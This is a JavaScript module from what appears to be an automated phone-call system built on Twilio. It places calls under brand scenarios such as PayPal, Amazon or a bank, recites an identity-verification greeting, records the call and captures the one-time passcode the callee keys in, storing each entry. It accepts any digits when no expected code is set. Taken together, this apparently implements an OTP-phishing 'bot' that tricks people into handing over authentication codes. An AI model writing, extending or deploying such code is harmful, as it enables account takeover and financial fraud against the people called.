const CallHandler = require('./CallHandler');
const OtpScenarioEngine = require('../services/OtpScenarioEngine');
const InputOrchestrator = require('../services/InputOrchestrator');

/**
 * OtpCallHandler - Handles OTP collection calls
 * Can be used standalone or integrated into GPT calls
 */
class OtpCallHandler extends CallHandler {
  constructor(metadata_json, options = {}) {
    super(metadata_json, options);
    this.otpEngine = new OtpScenarioEngine();
    this.inputOrchestrator = null;
    this.scenario = this.metadata.otp_scenario || null;
    this.expectedOtp = this.metadata.expected_otp || null;
    this.attemptCount = 0;
    this.maxAttempts = this.metadata.max_attempts || 3;
    this.phase = 'greeting'; // greeting, collecting, validating, completed
  }

  /**
   * Initialize OTP call
   */
  async initiate(to, from) {
    return this.executeWithErrorHandling(async () => {
      if (!this.db) {
        throw new Error('Database connection required for OtpCallHandler');
      }

      if (!this.scenario) {
        throw new Error('OTP scenario is required (e.g., "paypal", "amazon", "bank")');
      }

      // Validate scenario
      const scenarioConfig = this.otpEngine.getScenarioConfig(this.scenario);
      if (!scenarioConfig) {
        throw new Error(`Unknown OTP scenario: ${this.scenario}`);
      }

      // Create unified call record
      const callData = {
        call_type: 'otp',
        to,
        from,
        status: 'initiated',
        otp_scenario: this.scenario,
        metadata_json: JSON.stringify(this.metadata),
        started_at: new Date().toISOString()
      };

      const callRecord = await this.db.saveCall(callData);
      this.callSid = callRecord.call_sid;

      console.log(`🔐 Initiating OTP call ${this.callSid} for scenario: ${this.scenario}`);

      // Setup input orchestrator with OTP stage
      const otpStage = {
        stage: 'OTP',
        label: scenarioConfig.label,
        numDigits: scenarioConfig.digitLength,
        prompt: scenarioConfig.prompt,
        instructions: scenarioConfig.instructions || 'Listening for the code...',
        successMessage: scenarioConfig.successMessage || 'Code received.',
        failureMessage: scenarioConfig.failureMessage || 'That code didn\'t match. Please try again.',
        expectedValue: this.expectedOtp,
        maxAttempts: this.maxAttempts
      };

      this.inputOrchestrator = new InputOrchestrator({
        call_type: 'otp',
        collect_input_sequence: [otpStage],
        metadata_json: JSON.stringify(this.metadata)
      });

      // Create Twilio call
      const twilio = require('twilio');
      const config = require('../config');

      if (!config.twilio.accountSid || !config.twilio.authToken) {
        throw new Error('Twilio credentials not configured');
      }

      const client = twilio(config.twilio.accountSid, config.twilio.authToken);

      const webhookUrl = this.buildWebhookUrl(`/incoming?CallSid=${encodeURIComponent(this.callSid)}&call_type=otp`);

      try {
        const call = await client.calls.create({
          to,
          from: config.twilio.fromNumber || from,
          url: webhookUrl,
          method: 'POST',
          record: true,
          recordingTrack: 'both'
        });

        this.callSid = call.sid;

        // Update with actual Twilio SID
        await this.db.updateCall(this.callSid, {
          status: 'ringing'
        });

        this.setupTimeout();
        console.log(`✅ OTP call created: ${call.sid}`);

        return this.callSid;
      } catch (error) {
        await this.db.updateCall(this.callSid, {
          status: 'failed',
          ended_at: new Date().toISOString()
        });
        throw error;
      }
    }, 'initiate');
  }

  /**
   * Build webhook URL
   */
  buildWebhookUrl(path) {
    const config = require('../config');
    const publicHost = config.server.hostname;
    const port = config.server.port;

    if (publicHost) {
      return `https://${publicHost}${path}`;
    }
    return `http://localhost:${port}${path}`;
  }

  /**
   * Handle incoming call - prompt for OTP
   */
  async handleIncoming(twimlResponse) {
    return this.executeWithErrorHandling(async () => {
      const scenarioConfig = this.otpEngine.getScenarioConfig(this.scenario);
      if (!scenarioConfig) {
        throw new Error(`Invalid scenario: ${this.scenario}`);
      }

      const twiml = new (require('twilio').twiml.VoiceResponse)();

      if (this.phase === 'greeting') {
        // Initial greeting
        twiml.say(scenarioConfig.greeting || `We're verifying your identity. Please have your ${scenarioConfig.label} code ready.`);
        this.phase = 'collecting';
      }

      // Gather OTP digits
      twiml.gather({
        numDigits: scenarioConfig.digitLength,
        timeout: 10,
        actionOnEmptyResult: false
      });

      twiml.redirect(this.buildWebhookUrl(`/incoming?CallSid=${encodeURIComponent(this.callSid)}&call_type=otp&action=gather`));

      return twiml;
    }, 'handleIncoming');
  }

  /**
   * Handle DTMF input - validate OTP
   */
  async handleDtmf(digits, stageKey = 'OTP') {
    return this.executeWithErrorHandling(async () => {
      if (!digits || digits.length === 0) {
        this.attemptCount++;
        return {
          success: false,
          reason: 'empty_input',
          attempt: this.attemptCount,
          maxAttempts: this.maxAttempts
        };
      }

      this.attemptCount++;

      const callRecord = await this.db.getCall(this.callSid);
      if (!callRecord) {
        throw new Error(`Call record not found: ${this.callSid}`);
      }

      // Validate OTP
      const isValid = await this.validateOtp(digits);

      if (!isValid) {
        // Log failed attempt
        await this.db.saveCallInput({
          call_sid: this.callSid,
          stage: 'OTP',
          input_value: digits,
          is_valid: false,
          attempt_number: this.attemptCount,
          metadata: JSON.stringify({
            scenario: this.scenario,
            reason: 'invalid_otp'
          })
        });

        // Check if max attempts exceeded
        if (this.attemptCount >= this.maxAttempts) {
          await this.handleMaxAttemptsExceeded(callRecord);
          return {
            success: false,
            reason: 'max_attempts_exceeded',
            attempt: this.attemptCount,
            maxAttempts: this.maxAttempts
          };
        }

        // Prompt retry
        const scenarioConfig = this.otpEngine.getScenarioConfig(this.scenario);
        const retryMessage = scenarioConfig.failureMessage || 'That code didn\'t match. Please try again.';

        return {
          success: false,
          reason: 'invalid_otp',
          attempt: this.attemptCount,
          maxAttempts: this.maxAttempts,
          retryMessage,
          shouldRetry: true
        };
      }

      // Valid OTP
      this.phase = 'completed';

      // Log successful collection
      await this.db.saveCallInput({
        call_sid: this.callSid,
        stage: 'OTP',
        input_value: digits,
        is_valid: true,
        attempt_number: this.attemptCount,
        metadata: JSON.stringify({
          scenario: this.scenario,
          reason: 'valid_otp'
        })
      });

      console.log(`✅ Valid OTP received for ${this.callSid} (attempt ${this.attemptCount})`);

      return {
        success: true,
        attempt: this.attemptCount,
        maxAttempts: this.maxAttempts
      };
    }, 'handleDtmf');
  }

  /**
   * Validate OTP against expected value
   */
  async validateOtp(enteredOtp) {
    if (!this.expectedOtp) {
      // No expected OTP configured, accept any input
      console.warn('⚠️ No expected OTP configured, accepting any input');
      return true;
    }

    const normalized = String(enteredOtp).trim();
    const expected = String(this.expectedOtp).trim();

    return normalized === expected;
  }

  /**
   * Handle max attempts exceeded
   */
  async handleMaxAttemptsExceeded(callRecord) {
    try {
      // Send SMS fallback
      const smsService = require('../routes/sms').EnhancedSmsService;
      if (smsService && this.metadata.fallback_to_sms !== false) {
        const smsMessage = this.metadata.sms_message || 
          `We couldn't verify your code on the call. Your code is: ${this.expectedOtp}. Reply STOP to opt out.`;
        
        try {
          await smsService.sendSMS(callRecord.to, smsMessage);
          console.log(`📱 Sent fallback SMS to ${callRecord.to}`);
        } catch (smsError) {
          console.warn('Failed to send SMS fallback:', smsError.message);
        }
      }

      // Log fallback attempt
      await this.db.logServiceHealth('otp_max_attempts', 'warning', {
        call_sid: this.callSid,
        scenario: this.scenario,
        attempts: this.attemptCount,
        fallback_sms: this.metadata.fallback_to_sms !== false
      });

    } catch (error) {
      console.error('Error handling max attempts:', error.message);
    }
  }

  /**
   * Handle status updates
   */
  async handleStatus(status) {
    return this.executeWithErrorHandling(async () => {
      const normalizedStatus = status.toLowerCase();

      console.log(`📊 OTP call ${this.callSid} status: ${normalizedStatus}`);

      if (normalizedStatus === 'answered') {
        this.phase = 'greeting';
      } else if (['completed', 'failed', 'no-answer', 'busy', 'canceled'].includes(normalizedStatus)) {
        await this.finalize(normalizedStatus);
      }

      // Update database
      await this.db.updateCallStatus(this.callSid, normalizedStatus, {
        status: normalizedStatus,
        updated_at: new Date().toISOString()
      });
    }, 'handleStatus');
  }

  /**
   * Finalize OTP call
   */
  async finalize(status) {
    try {
      const duration = Math.floor((Date.now() - this.startTime) / 1000);

      // Determine final outcome
      let outcome = 'failed';
      if (this.phase === 'completed') {
        outcome = 'success';
      } else if (status === 'no-answer') {
        outcome = 'no_answer';
      }

      await this.db.updateCall(this.callSid, {
        status,
        ended_at: new Date().toISOString(),
        duration_seconds: duration,
        metadata_json: JSON.stringify({
          ...this.metadata,
          otp_outcome: outcome,
          attempts: this.attemptCount
        })
      });

      // Cleanup
      await this.cleanup(status);

      console.log(`✅ OTP call ${this.callSid} finalized (${outcome}, ${duration}s)`);
    } catch (error) {
      console.error('Error finalizing OTP call:', error.message);
    }
  }

  /**
   * Get OTP call state
   */
  getState() {
    const base = super.getState();
    return {
      ...base,
      scenario: this.scenario,
      phase: this.phase,
      attemptCount: this.attemptCount,
      maxAttempts: this.maxAttempts
    };
  }
}

module.exports = OtpCallHandler;
